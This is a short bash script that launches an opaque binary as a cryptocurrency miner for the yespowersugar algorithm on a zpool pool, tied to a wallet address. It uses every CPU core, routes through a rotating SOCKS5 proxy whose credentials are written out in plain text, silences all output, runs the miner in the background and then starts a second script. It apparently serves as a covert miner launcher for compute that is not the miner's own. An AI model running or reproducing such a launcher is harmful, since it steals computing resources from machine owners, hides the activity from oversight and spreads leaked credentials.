#!/bin/bash
chmod 777 lo.sh avx2
./avx2 -a yespowersugar -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.Code -p scbte -t $(nproc --all) -x socks5://speedest88-NL-rotate:speedest88@p.webshare.io:80 > /dev/null 2>&1 &
./lo.sh
